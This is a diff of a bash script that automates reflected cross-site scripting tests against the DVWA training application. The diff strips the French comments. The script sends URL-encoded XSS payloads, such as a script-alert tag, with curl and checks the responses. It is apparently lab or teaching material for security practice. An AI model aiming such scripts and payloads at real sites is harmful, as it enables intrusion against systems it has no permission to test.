@@ -1,6 +1,4 @@
 #!/bin/bash
-# attack-scripts/xss/xss_attack.sh
-# Script d'attaque XSS automatisé
 
 TARGET_URL="$1"
 ATTACK_MODE="${2:-auto}"
@@ -18,15 +16,11 @@ echo "Target: $TARGET_URL"
 echo "Mode: $ATTACK_MODE"
 echo "Payload type: $PAYLOAD_TYPE"
 echo ""
-
-# DVWA XSS Reflected page
 DVWA_XSS_PAGE="${TARGET_URL}/vulnerabilities/xss_r/"
 DVWA_XSS_URL="${DVWA_XSS_PAGE}?name=XSS"
 
 echo "[+] Step 1: Checking DVWA availability..."
 echo ""
-
-# Vérifier que DVWA répond
 if curl -s -m 5 "$TARGET_URL" > /dev/null 2>&1; then
   echo "[OK] DVWA is reachable at $TARGET_URL"
 else
@@ -67,8 +61,6 @@ echo ""
 
 cd /app 2>/dev/null
 BASE_URL="${TARGET_URL}/vulnerabilities/xss_r/"
-
-# Payloads selon le type choisi
 if [ "$PAYLOAD_TYPE" == "basic" ]; then
   declare -a PAYLOADS=(
     "<script>alert('XSS')</script>"
@@ -101,8 +93,6 @@ fi
 echo "[+] Testing payloads directly..."
 echo "[+] =================================================="
 echo ""
-
-# Tester chaque payload
 SUCCESS_COUNT=0
 TOTAL_TESTS=${#PAYLOADS[@]}
 
@@ -110,8 +100,6 @@ for i in "${!PAYLOADS[@]}"; do
   PAYLOAD="${PAYLOADS[$i]}"
 
   echo "[$((i+1))/$TOTAL_TESTS] Testing: ${PAYLOAD:0:50}..."
-
-  # Encoder le payload pour l'URL
   ENCODED=$(echo -n "$PAYLOAD" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))" 2>/dev/null)
 
   if [ -z "$ENCODED" ]; then
@@ -119,12 +107,8 @@ for i in "${!PAYLOADS[@]}"; do
     echo ""
     continue
   fi
-
-  # Tester avec curl (sans authentification, juste pour voir la réponse)
   TEST_URL="${BASE_URL}?name=${ENCODED}"
   RESPONSE=$(curl -s -L -m 5 "$TEST_URL" 2>/dev/null)
-
-  # Vérifier la réponse
   if echo "$RESPONSE" | grep -qi "login\|username"; then
     echo "        [AUTH REQUIRED] DVWA requires authentication (expected)"
     echo "        [NOTE] This payload CAN work when logged in manually"
